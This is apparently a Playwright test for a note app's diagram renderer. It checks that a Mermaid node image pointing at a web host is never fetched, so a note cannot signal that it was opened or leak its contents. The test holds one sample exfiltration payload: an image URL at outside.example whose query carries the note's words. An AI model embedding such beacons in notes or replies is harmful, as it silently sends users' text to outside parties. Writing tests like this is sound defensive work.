// What a note holds never reaches out to another site by itself. A note can be someone else's file, and an AI writes
// into notes: a diagram that named a picture on the web would make the page ask that site for it as soon as it is
// drawn, with whatever the address carries (a way to learn that a note was opened, or to send its words away without
// a click). Mermaid has such a shape (`img:`); a diagram is drawn without it.
import { expect, test } from './fixtures.js'

test.use({ viewport: { width: 1280, height: 1200 } })

test('a diagram that names a picture on the web is drawn without asking the web for it', async ({ page, refused }) => {
  const asked: string[] = []
  await page.route('https://outside.example/**', (route) => {
    asked.push(route.request().url())
    // A one-pixel picture, so that nothing fails on the way.
    return route.fulfill({ contentType: 'image/gif', body: Buffer.from('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', 'base64') })
  })
  await page.goto('/?sample=mixed')
  await expect(page.locator('.nw-desk[data-tool]')).toBeVisible()
  await expect(page.locator('.nw-diagram[data-drawn]')).toHaveCount(2, { timeout: 15_000 })
  // As a note file or an AI's reply could write it: a node that is a picture, its address carrying words of the note.
  const src = ['flowchart LR', '  A@{ img: "https://outside.example/pixel.gif?words=the-notes-words", label: "Start", w: 60, h: 60 }', '  A --> B[End]'].join('\n')
  await page.evaluate((src) => window.__shellnote!.store.apply([{ op: 'update', id: 'df', set: { src } }]), src)
  // Drawn again, with the node's words; and given time to ask, had it been going to.
  await expect(page.locator('.nw-free[data-free="diagram"] .nw-diagram[data-drawn]')).toContainText('End', { timeout: 15_000 })
  await page.waitForTimeout(1500)
  expect(asked).toEqual([])
  // No picture from the web is left in the drawing, so none is asked for later either (a thumbnail, a print).
  const outside = await page.evaluate(() => [...document.querySelectorAll('.nw-diagram-svg image, .nw-diagram-svg img')].map((image) => image.getAttribute('href') ?? image.getAttribute('xlink:href') ?? image.getAttribute('src') ?? '').filter((address) => /^(?:https?:)?\/\//iu.test(address)))
  expect(outside).toEqual([])
  // Under the app's policy the request would be refused as well: that is the second wall, not this test's subject.
  refused.length = 0
})
